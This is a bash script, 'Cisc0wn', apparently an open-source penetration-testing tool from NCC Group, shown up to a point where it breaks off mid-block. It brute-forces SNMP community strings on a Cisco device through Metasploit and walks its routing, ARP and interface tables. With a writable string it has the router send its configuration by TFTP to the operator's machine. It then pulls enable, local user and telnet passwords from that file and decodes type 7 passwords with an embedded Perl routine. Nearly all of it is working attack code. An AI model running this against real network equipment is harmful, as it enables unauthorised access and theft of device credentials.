#!/bin/bash
# Cisc0wn - The Cisco SNMP 0wner.
# Daniel Compton
# www.commonexploits.com
# contact@commexploits.com
# Twitter = @commonexploits
# 29/05/2012
# Requires metasploit, snmpwalk and john the ripper - suggest backtrack as built in (tested on BT5)
VERSION="1.8" # updated 16/03/15 by darren dot mcdonald @ nccgroup dot com - See README for details
# updated 03/09/2015 by Jason Soto, jason_soto at jsitech dot com - SEE README

#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com
# Updated by tom.watson @ nccgroup.com
# Updated by Jason Soto, jason_soto@jsitech.com

# https://github.com/nccgroup/cisco-SNMP-enumeration

# Released under AGPL see LICENSE for more information

######################################################################################


# user config settings
COM_PASS1="/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt" #old location of snmp communities to try
OUTPUTDIR="/tmp/" #where config files downloaded will be stored
SNMPVER="2c" #2c or change to 1
PORT="161" #default snmp port
JOHNDIR="/usr/sbin/" #john location on BT.
JOHNPASS="/usr/share/john/" #Location john password file
THREADS="10" #metasploit threads to use
JOHNWAIT="300" #seconds for john ripper to sleep whilst trying quick dictionary attack
MYINT="eth0" # your local network interface, it assume is eth0. Only used to read your IP address for info.

clear

echo -e "\e[00;31m#############################################################\e[00m"
echo -e "***   \e[00;31mCisc\e[00m\e[00;34m0wn\e[00m - The Cisco SNMP 0wner version $VERSION       ***"
echo -e "***   \e[00;34mAuto brute forces SNMP and extracts useful stuff\e[00m ***"
echo -e "\e[00;31m#############################################################\e[00m"
echo ""


#Dependency checking

echo -e "\e[00;34m-------------------------------------------\e[00m"
echo "Checking dependencies"
echo -e "\e[00;34m-------------------------------------------\e[00m"

#Check for metasploit
which msfconsole >/dev/null
if [ $? -eq 0 ]
	then
		echo ""
        echo -e "\e[00;32mI have found the required Metasploit program\e[00m"

else
		echo ""
        echo -e "\e[00;31mUnable to find the required Metasploit program, install and try again\e[00m"
        exit 1
fi

#Check for snmpwalk
which snmpwalk >/dev/null
if [ $? -eq 0 ]
	then
		echo ""
        echo -e "\e[00;32mI have found the required snmpwalk program\e[00m"

else
		echo ""
        echo -e "\e[00;31mUnable to find the required snmpwalk program, install and try again\e[00m"
        exit 1
fi

#Check for john ripper
which john >/dev/null
if [ $? -eq 0 ]
	then
		echo ""
        echo -e "\e[00;32mI have found the required John the Ripper program\e[00m"

else
		echo ""
        echo -e "\e[00;31mUnable to find the required John the Ripper program, script can continue but won't be able to crack any MD5 passwords\e[00m"
fi

#Check for screen
which screen >/dev/null
if [ $? -eq 0 ]
	then
		echo ""
        echo -e "\e[00;32mI have found the required screen program\e[00m"

else
		echo ""
        echo -e "\e[00;31mUnable to find the required screen program, script can continue but won't be able to crack any MD5 passwords\e[00m"
fi

#Check for default community string file
if [ -f $COM_PASS1 ]
    then
        COM_PASS=$COM_PASS1
        echo ""
        echo -e "\e[00;32mI have found the community strings file\e[00m"
    elif [ -f $COM_PASS2 ]
        then
            COM_PASS=$COM_PASS2
            echo ""
            echo -e "\e[00;32mI have found the community strings file\e[00m"
    else
        echo ""
        echo -e "\e[00;31mUnable to find the community strings file\e[00m"
        exit 1
fi


echo ""
echo "--------------------------------------------- Settings -----------------------------------------------"
echo ""
echo -e "Output directory is set to \e[00;32m$OUTPUTDIR\e[00m"
echo ""
echo -e "SNMP community password list is set to \e[00;32m$COM_PASS\e[00m"
echo ""
echo -e "John the Ripper is assumed to be installed here \e[00;32m$JOHNDIR\e[00m"
echo ""
echo -e "John the Ripper Password List is set to \e[00;32m$JOHNPASS\e[00m"
echo ""
echo "These settings and others can be changed within the header of this script"
echo ""
echo "------------------------------------------------------------------------------------------------------"
echo -e " Press ENTER to continue or CTRL C to cancel... \c"
read enterkey
clear

# script starts do not alter

# Cisco OIDs used
# Routing Info
ROUTDESTOID=".1.3.6.1.2.1.4.21.1.1" # Destination
ROUTHOPOID=".1.3.6.1.2.1.4.21.1.7" # Next Hop
ROUTMASKOID=".1.3.6.1.2.1.4.21.1.11" # Mask
ROUTMETOID=".1.3.6.1.2.1.4.21.1.3" # Metric
ROUTINTOID=".1.3.6.1.2.1.4.21.1.2" # Interface
ROUTTYPOID=".1.3.6.1.2.1.4.21.1.8" # Route type
ROUTPROTOID=".1.3.6.1.2.1.4.21.1.9" # Route protocol
ROUTAGEOID=".1.3.6.1.2.1.4.21.1.10" # Route age
#Interface Info
INTLISTOID=".1.3.6.1.2.1.2.2.1.2" # Interfaces
INTIPLISTOID=".1.3.6.1.2.1.4.20.1.1" # IP address
INTIPMASKOID=".1.3.6.1.2.1.4.20.1.3" # Subnet mask
INTSTATUSLISTOID=".1.3.6.1.2.1.2.2.1.8" # Stauts
# Arp table
ARPADDR=".1.3.6.1.2.1.3.1 " # Arp address



echo -e "\e[1;31m----------------------------------------------------\e[00m"
echo "Enter the IP address of the Cisco device to scan"
echo -e "\e[1;31m----------------------------------------------------\e[00m"
read CISCOIP
echo ""
echo -e "\e[1;33m------------------------------------------------------------------\e[00m"
echo "Just checking that SNMP is open and accessible from this system"
echo -e "\e[1;33m------------------------------------------------------------------\e[00m"
NMAP=`nmap -sU -sV -p $PORT $CISCOIP 2>&1 |grep "open" | awk '{ print $2 }'`
if [ "$NMAP" = "open" ]
then
	echo -e "\e[00;32mSNMP was found enabled, script will continue\e[00m"
else
	echo ""
	echo -e "\e[1;31mError. SNMP is either closed or filtered from this device. Check connectivity and try again. Script can't continue...\e[00m"
	echo ""
	exit 1
fi
echo ""
COMNO=`cat "$COM_PASS" | wc -l`
echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
echo "Now testing read only SNMP communities with "$COMNO" strings - please wait...."
echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
READCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" 2>&1 |grep -i "read-only" | awk '{ print $6 }'`
clear
if [ -z "$READCOM" ]
then
	echo ""
	echo -e "\e[1;31mI didn't find any read only community strings. Try setting the COM_PASS value in the script to a custom list and try again.\e[00m"
	echo ""
	echo -e "\e[1;33mIt is possible that the community string has an access-list applied\e[00m"
	echo ""
	echo -e "\e[1;33mScript will continue as there may be a writable string that can be used.\e[00m"
	echo ""
	echo "Press enter to continue"
	read enterkey
else
	echo -e "\e[1;33m----------------------------------------------------------------------------------------------------------------------------------\e[00m"
	echo "I found the following read only community strings. If multiple strings were found I will just use the first one for enumeration"
	echo -e "\e[1;33m----------------------------------------------------------------------------------------------------------------------------------\e[00m"
	echo -e "\e[00;32m$READCOM\e[00m"
	echo ""
echo "Press enter to continue"
read enterkey
READCOM1=`echo "$READCOM" | head -1`
fi
echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
echo "Now testing for writable SNMP communities with "$COMNO" strings - please wait...."
echo -e "\e[1;33m------------------------------------------------------------------------------\e[00m"
echo ""
WRITCOM=`msfconsole -Lqx "use auxiliary/scanner/snmp/snmp_login; set RHOSTS $CISCOIP; set PASS_FILE $COM_PASS; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" 2>&1 |grep -i "read-write" | awk '{ print $6 }'`
#WRITCOM=`msfcli auxiliary/scanner/snmp/snmp_login RHOSTS=$CISCOIP PASS_FILE=$COM_PASS RETRIES=1 RPORT=$PORT THREADS=$THREADS VERSION=1 E 2>&1 |grep -i "READ-WRITE" | cut -d "'" -f 2`
if [[ -z "$READCOM" && -z "$WRITCOM" ]]
then
	echo -e "\e[1;31mI didnt find any read or write community strings. Try setting the COM_PASS value in the script to a custom list and try again. It is possible that the community has a access-list applied. I can't continue, script will exit\e[00m"
	exit 1
elif [ -z "$WRITCOM" ]
then
        echo ""
		echo -e "\e[1;31mI didnt find any writable community strings. Try setting the COM_PASS value in the script to a custom list and try again\e[00m"
		echo ""
        echo -e "\e[1;33mI will need a writable string to obtain the config later on, I will continue with read only.\e[00m"
		echo ""
		echo "Press enter to continue with read only, or CTRL C to quit and try and find the write community"
	    read enterkey

else
		echo -e "\e[1;33m----------------------------------------------------------------------------------------------------------------------------------\e[00m"
        echo "I found the following writable community strings. If mulitple strings were found I will just use the first one for enumeration"
		echo -e "\e[1;33m----------------------------------------------------------------------------------------------------------------------------------\e[00m"
        echo -e "\e[00;32m$WRITCOM\e[00m"
		echo ""
		echo "Press enter to continue"
		read enterkey
WRITCOM1=`echo "$WRITCOM" | head -1`
fi
clear

if [ -z "$READCOM1" ]
then
	echo ""
	echo -e "\e[1;33mI will use the writable string of "$WRITCOM" as no read only was found\e[00m"
	ENUMCOM=`echo "$WRITCOM1"`
else
	ENUMCOM=`echo "$READCOM1"`
fi
echo -e "\e[1;33m------------------------------------------------------------------------------------------------------------------------\e[00m"
echo "Now extracting all info I can from "$CISCOIP" using community string "$ENUMCOM", please wait...."
echo -e "\e[1;33m------------------------------------------------------------------------------------------------------------------------\e[00m"

IOS=`snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP |grep "RELEASE SOFTWARE" | awk '{ print $0 }' |awk '{sub(/^[ \t]+/, ""); print}'`
clear
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------\e[00m"
echo "The following IOS version was found"
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[00;32m"$IOS"\e[00m"
echo ""
CONTACT=`snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP SNMPv2-MIB::sysContact.0 | cut -d ":" -f 4 |awk '{sub(/^[ \t]+/, ""); print}'`
if [ -z "$CONTACT" ]
then
	echo ""
else
	echo -e "\e[1;33m-----------------------------------------------------------------\e[00m"
	echo "I found the following snmp contact info"
	echo -e "\e[1;33m-----------------------------------------------------------------\e[00m"
	echo -e "\e[00;32m"$CONTACT"\e[00m"
	echo ""
fi
HOSTNAME=`snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP SNMPv2-MIB::sysName.0 | cut -d ":" -f 4 |awk '{sub(/^[ \t]+/, ""); print}'`
if [ -z "$HOSTNAME" ]
then
	echo ""
else
	echo -e "\e[1;33m------------------------------------\e[00m"
	echo "I found the following hostname"
	echo -e "\e[1;33m------------------------------------\e[00m"
	echo -e "\e[00;32m"$HOSTNAME"\e[00m"
	echo ""
fi
echo "press enter to continue"
read enterkey
clear
echo ""
echo "Now attempting to extract any routing tables"
echo ""

#check for any routes, might be layer 2 device

ANYROUTES=`snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP .1.3.6.1.2.1.4.21.1.1 | awk '{print $NF}' 2>&1`
if [ "$ANYROUTES" = "OID" ]
then
	echo ""
	echo -e "\e[1;33mI can't find any routing tables, this is probably a Layer 2 device. I will skip this part\e[00m"
	echo ""
	echo ""
	else

# routing table format headers
echo "-------------------" >"$OUTPUTDIR"ROUTDEST
echo "Destination" >>"$OUTPUTDIR"ROUTDEST
echo "-------------------">>"$OUTPUTDIR"ROUTDEST

echo "-----------------" >"$OUTPUTDIR"ROUTHOP
echo "Next_Hop" >>"$OUTPUTDIR"ROUTHOP
echo "-----------------">>"$OUTPUTDIR"ROUTHOP

echo "---------------" >"$OUTPUTDIR"ROUTMASK
echo "Mask" >>"$OUTPUTDIR"ROUTMASK
echo "---------------">>"$OUTPUTDIR"ROUTMASK

echo "-----------" >"$OUTPUTDIR"ROUTMET
echo "Metric" >>"$OUTPUTDIR"ROUTMET
echo "-----------">>"$OUTPUTDIR"ROUTMET

echo "-----------" >"$OUTPUTDIR"ROUTINT
echo "Interface" >>"$OUTPUTDIR"ROUTINT
echo "-----------">>"$OUTPUTDIR"ROUTINT

echo "-----------" >"$OUTPUTDIR"ROUTTYP
echo "Type" >>"$OUTPUTDIR"ROUTTYP
echo "-----------">>"$OUTPUTDIR"ROUTTYP

echo "----------" >"$OUTPUTDIR"ROUTPROT
echo "Protocol" >>"$OUTPUTDIR"ROUTPROT
echo "----------">>"$OUTPUTDIR"ROUTPROT

echo "--------" >"$OUTPUTDIR"ROUTAGE
echo "Age" >>"$OUTPUTDIR"ROUTAGE
echo "--------">>"$OUTPUTDIR"ROUTAGE


#snmp walk the routing table OIDs into temp files
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTDESTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTDEST
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTHOPOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTHOP
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTMASKOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTMASK
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTMETOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTMET
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTINTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTINT
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTTYPOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTTYP
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTPROTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTPROT
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ROUTAGEOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"ROUTAGE


paste "$OUTPUTDIR"ROUTDEST "$OUTPUTDIR"ROUTHOP "$OUTPUTDIR"ROUTMASK "$OUTPUTDIR"ROUTMET "$OUTPUTDIR"ROUTINT "$OUTPUTDIR"ROUTTYP "$OUTPUTDIR"ROUTPROT "$OUTPUTDIR"ROUTAGE |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-routes.txt
echo ""
echo -e "\e[00;32mRouting Tables Extracted\e[00m"
echo ""
cat "$OUTPUTDIR$CISCOIP"-routes.txt
#remove temp files
rm "$OUTPUTDIR"ROUT* 2>&1 >/dev/null
echo ""
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------\e[00m"
echo -e "The routing table has also been saved to the following location \e[1;33m"$OUTPUTDIR$CISCOIP"-routes.txt\e[00m"
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------\e[00m"
fi
echo ""
echo "Press enter to continue"
read enterkey
clear

# Arp table headers
echo "------------------" >"$OUTPUTDIR"ARPADDRESS
echo "IP_Address        " >>"$OUTPUTDIR"ARPADDRESS
echo "------------------" >>"$OUTPUTDIR"ARPADDRESS

echo "-------------------------" >"$OUTPUTDIR"ARPDARDWARE
echo "Physical_Address         " >>"$OUTPUTDIR"ARPDARDWARE
echo "-------------------------" >>"$OUTPUTDIR"ARPDARDWARE

# arp table

snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ARPADDR |grep "RFC1213-MIB::atIfIndex.1.1." | cut -d "." -f 4,5,6,7 | cut -d "=" -f 1 2>&1 >>"$OUTPUTDIR"ARPADDRESS
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $ARPADDR |grep "RFC1213-MIB::atPhysAddress" |cut -d ":" -f 4 |awk '{sub(/^[ \t]+/,""); print}' | awk '{gsub(/ /,":");print}' 2>&1 >>"$OUTPUTDIR"ARPDARDWARE


paste "$OUTPUTDIR"ARPADDRESS "$OUTPUTDIR"ARPDARDWARE |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-arptable.txt
echo ""
echo -e "\e[00;32mArp Table Extracted\e[00m"
echo ""
cat "$OUTPUTDIR$CISCOIP"-arptable.txt
#remove temp files
rm "$OUTPUTDIR"ARP* 2>&1 >/dev/null
echo ""
echo -e "\e[1;33m----------------------------------------------------------------------------------------------------\e[00m"
echo -e "The arp table has also been saved to the following location \e[1;33m"$OUTPUTDIR$CISCOIP"-arptable.txt\e[00m"
echo -e "\e[1;33m----------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo "Press enter to continue"
read enterkey
clear


# Interface header info
echo "-------------------" >"$OUTPUTDIR"INTLIST
echo "Interface" >>"$OUTPUTDIR"INTLIST
echo "-------------------">>"$OUTPUTDIR"INTLIST

echo "-----------" >"$OUTPUTDIR"INTSTATUSLIST
echo "Status" >>"$OUTPUTDIR"INTSTATUSLIST
echo "-----------">>"$OUTPUTDIR"INTSTATUSLIST

#snmp walk the interface OIDs into temp files
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTLISTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"INTLIST
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTSTATUSLISTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"INTSTATUSLIST

paste "$OUTPUTDIR"INTLIST "$OUTPUTDIR"INTSTATUSLIST |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-interfaces.txt
echo ""
echo -e "\e[00;32mInterfaces Extracted\e[00m"
echo ""
cat "$OUTPUTDIR$CISCOIP"-interfaces.txt
#remove temp files
rm "$OUTPUTDIR"INT* 2>&1 >/dev/null
echo ""
echo -e "\e[1;33m-----------------------------------------------------------------------------------------------------------------\e[00m"
echo -e "The interface list has also been saved to the following location \e[1;33m"$OUTPUTDIR$CISCOIP"-interfaces.txt\e[00m"
echo -e "\e[1;33m-----------------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo "Press enter to continue"
read enterkey

clear

# IP Address header info
echo "-----------------" >"$OUTPUTDIR"IPLIST
echo "IP_Address" >>"$OUTPUTDIR"IPLIST
echo "-----------------">>"$OUTPUTDIR"IPLIST

echo "---------------" >"$OUTPUTDIR"IPMASK
echo "Subnet_Mask" >>"$OUTPUTDIR"IPMASK
echo "---------------">>"$OUTPUTDIR"IPMASK

#snmp walk the IP Addresses OIDs into temp files
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTIPLISTOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"IPLIST
snmpwalk -c $ENUMCOM -v$SNMPVER $CISCOIP $INTIPMASKOID | awk '{print $NF}' 2>&1 >>"$OUTPUTDIR"IPMASK


paste "$OUTPUTDIR"IPLIST "$OUTPUTDIR"IPMASK |column -t 2>&1 >"$OUTPUTDIR$CISCOIP"-iplist.txt
echo ""
echo -e "\e[00;32mIP Addresses Extracted\e[00m"
echo ""
cat "$OUTPUTDIR$CISCOIP"-iplist.txt
#remove temp files
rm "$OUTPUTDIR"IP* 2>&1 >/dev/null
echo ""
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------\e[00m"
echo -e  "The IP address list has also been saved to the following location \e[1;33m"$OUTPUTDIR$CISCOIP"-iplist.txt\e[00m"
echo -e "\e[1;33m-------------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo "Press enter to continue"
read enterkey
clear

# config download check if have write community string
echo "$WRITCOM" >/dev/null
if [ -z "$WRITCOM" ]
then
	echo -e "\e[1;33m-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
	echo -e "\e[1;31mI will not be able to attempt to download the config, as I didnt find any writable community string earlier.\e[00m"
	echo ""
	echo -e "\e[1;31mScript will now exit as I have done all I can with read only access\e[00m"
	echo -e "\e[1;33m-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
	exit 1
else
echo -e "\e[1;33m----------------------------------------------------------------------------------------------------------------------------------\e[00m"
echo "I will download the config now using the writable snmp community of "$WRITCOM1", your network must allow an inbound connection"
echo ""
echo "I will need your local IP address. make sure any firewall is disabled as a TFTP inbound connection will be used"
LOCAL=`ifconfig $MYINT |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }'`
echo ""
fi
echo -e "I believe your IP address is \e[1;33m"$LOCAL"\e[00m on \e[1;33m"$MYINT"\e[00m but please enter it below to confirm"
echo -e "\e[1;33m----------------------------------------------------------------------------------------------------------------------------------\e[00m"
read LOCALIP
clear
echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
echo "Now attempting to download the router config file, please wait"
echo -e "\e[1;33m----------------------------------------------------------------------------\e[00m"
msfconsole -x "auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS $CISCOIP; set LHOST $LOCALIP; set COMMUNITY $WRITCOM1; set OUTPUTDIR $OUTPUTDIR; set RETRIES 1; set RPORT $PORT; set THREADS $THREADS; set VERSION $SNMPVER; run; exit -y" >/dev/null 2>&1
cat "$OUTPUTDIR$CISCOIP.txt" >/dev/null 2>&1
if [ $? = 1 ]
then
	echo -e "\e[1;33m-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
	echo -e "\e[1;31mSorry there was a problem I couldnt TFTP download the config. Check your IP and firewall settings and try again. If using a VM ensure it is in bridged mode and not NAT\e[00m"
	echo -e "\e[1;33m-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
	exit 1
else
	mv "$OUTPUTDIR$CISCOIP.txt" "$OUTPUTDIR$CISCOIP-router-config.txt"
	echo ""
	echo -e "\e[00;32mSuccess. I downloaded the Cisco config to the following location\e[00m \e[1;33m$OUTPUTDIR$CISCOIP-router-config.txt\e[00m"
	echo ""
	echo "Press enter to continue"
read enterkey
fi
clear

# look for encoded or clear text enable passwords
`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable password 7" >/dev/null 2>&1`
if [ $? = 0 ]
then
		ENPW7=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable password 7" |awk '{print $NF}' 2>&1`
		echo -e "\e[1;33m----------------------------------------------------------------------------------------\e[00m"
		echo "Service password-encryption is enabled. your enable encoded type 7 password string is"
		echo -e "\e[1;33m----------------------------------------------------------------------------------------\e[00m"
		echo -e "\e[00;32m"$ENPW7"\e[00m"
		echo "$ENPW7" >"$OUTPUTDIR$CISCOIP-ciscoenable7pw.txt"
		echo ""
		ENPW7P="$ENPW7"
		export ENPW7P
		echo -e "\e[1;33m---------------------------------------------\e[00m"
		echo "Your decoded enable type 7 password is"
		echo -e "\e[1;33m---------------------------------------------\e[00m"

###################################################### perl decode ###############################
perl <<'EOF'



@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42 );



                if (!(length($ENV{ENPW7P}) & 1)) {
                        $ep = $ENV{ENPW7P};
                        $dpassenable = "";
                        ($s, $e) = ($ep =~ /^(..)(.+)/);
                        for ($i = 0; $i < length($e); $i+=2){
                                $dpassenable .= sprintf "%c",hex(substr($e,$i,2))^$xlat[$s++];
                        }
                }
                print "$dpassenable\n";
EOF
###################################################### end of perl decode ###############################
echo ""
echo "Press enter to continue"
read enterkey
	else
		echo""
		echo -e "\e[1;33mIt seems that that no encoded enable 7 password is set.\e[00m"
		echo""
fi

	CLRENABLE=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable password" | awk '{print $3}' 2>&1`
	if [ -z "$CLRENABLE" ]
	then
	echo ""
	echo -e "\e[1;33mI didn't find any clear text enable passwords set\e[00m"
	echo ""
	echo "Press enter to continue"
	read enterkey
	elif [ "$CLRENABLE" != "7" ]
then
echo
		echo -e "\e[1;33m----------------------------------------------------\e[00m"
		echo "I found a clear text enable password"
		echo -e "\e[1;33m----------------------------------------------------\e[00m"
		echo -e "\e[00;32m$CLRENABLE\e[00m"
		echo ""
		echo "Press enter to continue"
		read enterkey
	else
	echo ""

fi

clear
# look for local users with encoded passwords - if 1 user decode it, it >1 then just list them (will update to loop and decode them all soon).

ENLOCAL7ONE=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" |wc -l 2>&1)
if [ $ENLOCAL7ONE -gt 1 ]
then
		echo -e "\e[1;33m---------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
		echo "I found the following local users with type 7 encoded passwords. I am unable to decode more than 1 password, please use Cain & Abel or tools to decode the passwords"
		echo -e "\e[1;33m---------------------------------------------------------------------------------------------------------------------------------------------------------------------\e[00m"
		ENLOCAL7ONELIST=$(cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" 2>&1)
		echo "$ENLOCAL7ONELIST" >"$OUTPUTDIR$CISCOIP-ciscolocalusers7pw.txt"
		cat $OUTPUTDIR$CISCOIP-ciscolocalusers7pw.txt 2>&1
		echo ""
		echo "Press enter to continue"
		read enterkey

elif [ $ENLOCAL7ONE -eq 1 ]
then
		ENLOCAL7=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" |awk '{print $2}' 2>&1`
		echo -e "\e[1;33m----------------------------------------------------------------------------------------\e[00m"
		echo "I found the following local user on the device with a encoded type 7 password "
		echo -e "\e[1;33m----------------------------------------------------------------------------------------\e[00m"
		echo -e "\e[00;32m"$ENLOCAL7"\e[00m"
		echo "$ENPW7" >"$OUTPUTDIR$CISCOIP-ciscolocal7pw.txt"
		echo ""
		ENLOCAL7VAL=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "username" |grep "password 7" |awk '{print $NF}' 2>&1`
		echo -e "\e[1;33m----------------------------------------------------------------------------------------\e[00m"
		echo "User $ENLOCAL7 Encoded password value is"
		echo -e "\e[1;33m----------------------------------------------------------------------------------------\e[00m"
		echo -e "\e[00;32m"$ENLOCAL7VAL"\e[00m"
		echo "$ENPW7" >"$OUTPUTDIR$CISCOIP-ciscolocal7pw.txt"
		echo ""

		ENLOCAL7VALP="$ENLOCAL7VAL"
		export ENLOCAL7VALP
		echo -e "\e[1;33m---------------------------------------------\e[00m"
		echo "Your decoded password for user "$ENLOCAL7" is"
		echo -e "\e[1;33m---------------------------------------------\e[00m"

###################################################### perl decode ###############################
perl <<'EOF'



@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42 );



                if (!(length($ENV{ENLOCAL7VALP}) & 1)) {
                        $ep = $ENV{ENLOCAL7VALP};
                        $dpassenable = "";
                        ($s, $e) = ($ep =~ /^(..)(.+)/);
                        for ($i = 0; $i < length($e); $i+=2){
                                $dpassenable .= sprintf "%c",hex(substr($e,$i,2))^$xlat[$s++];
                        }
                }
                print "$dpassenable\n";
EOF
###################################################### end of perl decode ###############################
echo ""
echo "Press enter to continue"
read enterkey
	else
		echo""
		echo -e "\e[1;33mIt seems that that no encoded enable 7 password is set.\e[00m"
		echo""
fi

	CLRENABLE=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep "enable password" | awk '{print $3}' 2>&1`
	if [ -z "$CLRENABLE" ]
	then
	echo ""
	echo -e "\e[1;33mI didn't find any clear text enable passwords set\e[00m"
	echo ""
	echo "Press enter to continue"
	read enterkey
	elif [ "$CLRENABLE" != "7" ]
then
echo
		echo -e "\e[1;33m----------------------------------------------------\e[00m"
		echo "I found a clear text enable password"
		echo -e "\e[1;33m----------------------------------------------------\e[00m"
		echo -e "\e[00;32m$CLRENABLE\e[00m"
		echo ""
		echo "Press enter to continue"
		read enterkey
	else
	echo ""

fi
clear
# look for encoded telnet passwords
VTPPW7=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep -B1 "login" |grep "password 7" |awk '{print $NF}' |head -1 2>&1`
if [ -z "$VTPPW7" ]
then

	echo -e "\e[1;33mThere doesn't seem to be any encoded telnet passwords set\e[00m"
	echo ""
	echo "Press enter to continue"
	read enterkey
else
	echo -e "\e[1;33m----------------------------------------------\e[00m"
	echo "I found the following encoded telnet password "
	echo -e "\e[1;33m----------------------------------------------\e[00m"
	echo -e "\e[00;32m$VTPPW7\e[00m"
	echo ""
	VTPPW7P="$VTPPW7"
	export VTPPW7P
	echo -e "\e[1;33m---------------------------------------\e[00m"
	echo "Your decoded telnet password is"
	echo -e "\e[1;33m---------------------------------------\e[00m"
###################################################### perl decode ###############################

perl <<'EOF2'



@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42 );



                if (!(length($ENV{VTPPW7P}) & 1)) {
                        $ep = $ENV{VTPPW7P};
                        $dpassvty = "";
                        ($s, $e) = ($ep =~ /^(..)(.+)/);
                        for ($i = 0; $i < length($e); $i+=2){
                                $dpassvty .= sprintf "%c",hex(substr($e,$i,2))^$xlat[$s++];
                        }
                }
                print "$dpassvty\n";
EOF2
###################################################### end of perl decode ###############################
echo ""
	echo "Press enter to continue"
	read enterkey
fi
clear
# look for clear text telnet passwords
    VTYPWCLRREV=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep -B1 "login" |grep "password" |awk '{print $NF}' |sort --unique 2>&1`
	VTYPWCLRREV2=`cat "$OUTPUTDIR$CISCOIP-router-config.txt" |grep -B1 "login" |grep "password 7" |awk '{print $NF}' |sort --unique 2>&1`
if [ -z "$VTYPWCLRREV" ]
	then
	echo ""
	echo -e "\e[1;33mNo telnet password for login appears to be set\e[00m"

elif [ -n "$VTYPWCLRREV2" ]
	then
	echo ""
else
	echo -e "\e[1;33m------------------------------------------------------------\e[00m"
	echo "I have found the following clear text telnet password set"
	echo -e "\e[1;33m------------------------------------------------------------\e[00m"
	echo -e "\e[00;32m$VTYPWCLRREV\e[00m"
	echo ""
